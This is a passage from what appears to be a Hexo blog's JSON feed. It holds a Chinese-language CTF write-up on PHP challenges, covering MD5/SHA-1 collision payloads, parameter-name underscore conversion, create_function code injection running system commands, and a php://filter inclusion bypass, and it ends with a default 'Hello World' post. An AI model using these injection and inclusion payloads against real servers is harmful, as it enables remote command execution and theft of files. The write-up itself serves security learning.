payload:<br>\narray1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;array2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<br>\n<mark> 这里要用 burp 抓包改传参方式为 post 才可以，hackbar 不知道为什么没有用</mark><br>\n更多关于 md5 的绕过看我这篇博客<a href=\"https://hq185187.github.io/2023/04/30/md5/\"> md5</a><br>\n 找到 Level___3.php<br>\n 然后就是 sha1 的强碰撞，sha1 的绕过和 md5 几乎一样<br>\n下面给一个大佬的 sha1 强碰撞的 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>\n<p>然后得到 level_level_4.php<br>\nPHP 会将请求参数的非法字符转换成下划线 (空格，点)<br>\nNI+SA+=txw4ever<br>\n 拓展:<br>\nPHP 需要将所有参数转换成有效的变量名，因此再解析字符串时，会做两件事:</p>\n<ol>\n<li>删除空白符</li>\n<li>将某些字符串转换为下划线<br>\n加号 (%2b) 空格 (%20) 点号 (%2e) <code>[(%5b)</code>  和_(%5f)</li>\n</ol>\n<p>得到 55_5_55.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//sorry , here is true last level</span></span><br><span class=\"line\"><span class=\"comment\">//^_^</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;str.php&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class=\"variable\">$a</span>)) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$a</span>(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$b</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里要学一个新知识:create_function 代码注入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?</span></span><br><span class=\"line\"><span class=\"variable\">$test</span>=<span class=\"title function_ invoke__\">create_function</span>(<span class=\"string\">&#x27;$a&#x27;</span>,<span class=\"string\">&#x27;$b&#x27;</span>,<span class=\"string\">&#x27;return($a+$b);&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$test</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">相当于:</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"><span class=\"variable\">$a</span>,<span class=\"variable\">$b</span></span>)</span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"variable\">$a</span>+<span class=\"variable\">$b</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>来个注入例子</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$test</span>=<span class=\"title function_ invoke__\">create_function</span>(<span class=\"string\">&#x27;$a&#x27;</span>,<span class=\"string\">&#x27;$b&#x27;</span>,<span class=\"string\">&#x27;return($a+$b);&#125;eval($_POST[&quot;a&quot;]);/*)</span></span><br><span class=\"line\"><span class=\"string\">相当于</span></span><br><span class=\"line\"><span class=\"string\">function test($a,$b)&#123;</span></span><br><span class=\"line\"><span class=\"string\">return($a+$b);&#125;</span></span><br><span class=\"line\"><span class=\"string\">eval($_POST[&quot;a&quot;]);/*</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>直接构造 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?a=\\create_function&amp;b=return &quot;1&quot;;)system(&quot;ls /&quot;);/*</span><br><span class=\"line\">?a=\\create_function&amp;b=return &quot;1&quot;;)system(&quot;cat /flag&quot;);/*</span><br></pre></td></tr></table></figure>\n<h3 id=\"14鹏城杯-2022简单包含\"><a class=\"markdownIt-Anchor\" href=\"#14鹏城杯-2022简单包含\">#</a> 14.[鹏城杯 2022] 简单包含</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag=php://filter/convert.base64-encode/resource=flag.php发现被过滤</span><br><span class=\"line\">flag=php://filter/convert.base64-encode/resource=index.php看源码</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$path</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;flag&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strlen</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;php://input&#x27;</span>)) &lt; <span class=\"number\">800</span> &amp;&amp; <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/flag/&#x27;</span>, <span class=\"variable\">$path</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;nssctf waf!&#x27;</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    @<span class=\"keyword\">include</span>(<span class=\"variable\">$path</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>post 的数据里有有 flag 并且 &gt;=800<br>\npayload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=aaaa(800个a)&amp;flag=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/23/hello-world/",
            "url": "https://hq185187.github.io/2023/04/23/hello-world/",
            "title": "Hello World",
            "date_published": "2023-04-23T15:55:29.640Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        }
    ]
}